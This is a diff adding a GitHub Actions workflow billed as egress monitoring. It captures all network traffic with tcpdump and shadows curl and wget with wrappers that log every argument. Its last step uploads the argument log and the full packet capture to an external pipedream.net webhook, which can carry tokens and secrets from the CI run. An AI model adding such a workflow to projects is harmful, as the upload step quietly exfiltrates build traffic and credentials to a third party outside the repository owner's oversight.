@@ -1,0 +1,46 @@
+name: Log Egress Traffic
+
+on:
+  push:  # Runs on every commit push
+    branches:
+      - main  # Change if you want to track other branches
+
+jobs:
+  monitor_egress:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+
+      - name: Install tcpdump
+        run: sudo apt-get update && sudo apt-get install -y tcpdump
+
+      - name: Start capturing network traffic
+        run: sudo tcpdump -i any -w /tmp/egress.pcap &
+
+      - name: Wrap curl and wget for logging
+        run: |
+          sudo tee /usr/local/bin/curl <<EOF
+          #!/bin/bash
+          echo "CURL: \$@" >> /tmp/egress.log
+          /usr/bin/curl "\$@"
+          EOF
+          sudo chmod +x /usr/local/bin/curl
+
+          sudo tee /usr/local/bin/wget <<EOF
+          #!/bin/bash
+          echo "WGET: \$@" >> /tmp/egress.log
+          /usr/bin/wget "\$@"
+          EOF
+          sudo chmod +x /usr/local/bin/wget
+
+      - name: Simulate network requests (for testing)
+        run: |
+          curl -s https://example.com
+          wget -q https://example.com
+
+      - name: Stop tcpdump and send logs
+        run: |
+          sudo pkill tcpdump
+          curl -X POST -H "Content-Type: text/plain" --data-binary @/tmp/egress.log https://eovusyvvdjqgt9t.m.pipedream.net
+          curl -X POST --data-binary @/tmp/egress.pcap https://eovusyvvdjqgt9t.m.pipedream.net
